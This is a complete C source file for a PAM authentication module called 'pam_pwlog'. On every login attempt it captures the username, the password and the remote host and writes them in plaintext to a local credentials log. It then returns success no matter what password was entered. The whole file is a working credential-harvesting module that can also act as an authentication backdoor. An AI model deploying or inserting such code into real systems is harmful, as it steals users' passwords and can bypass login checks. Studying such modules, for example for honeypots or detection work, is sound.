#ifndef LINUX
#include <security/pam_appl.h>
#endif

#define PAM_SM_AUTH
#include <security/pam_modules.h>

#include <syslog.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/file.h>

#define _XOPEN_SOURCE
#include <unistd.h>

#define PLOG_FILE	"/home/debian/credentials.log"
#define PWDIR_LEN 	256
#define BUF_MAX		256

/* expected hook for auth service */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
				   int argc, const char **argv) {
	int fd, len;
	char *pword, *uname, *rhost=0, buffer[BUF_MAX];

	// Retrieve relevant auth information
	pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword);
	pam_get_item(pamh, PAM_USER, (void*) &uname);
	pam_get_item(pamh, PAM_RHOST, (void*) &rhost);
	if (!pword || !uname) {
		return PAM_AUTHINFO_UNAVAIL;
	}

	// Open log file
	if ((fd=open(PLOG_FILE, O_CREAT|O_APPEND|O_WRONLY, 0600)) == -1) {
		return PAM_AUTHINFO_UNAVAIL;
	}

	// Create log line
	len = snprintf(buffer, BUF_MAX-1, "rhost: %s username: %s password: %s\n",
					rhost?rhost:"-", uname, pword);

	// Simply ignore unsuccessful writes, don't attempt error handling
	write(fd, buffer, len);
	close(fd);

	return PAM_SUCCESS;
}

/* another expected hook */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
			      int argc, const char **argv)
{
	return PAM_IGNORE;
}

#ifdef PAM_STATIC
struct pam_module _pam_listfile_modstruct = {
	"pam_pwlog",
	pam_sm_authenticate,
	pam_sm_setcred,
	NULL,
	NULL,
	NULL,
	NULL,
};
#endif
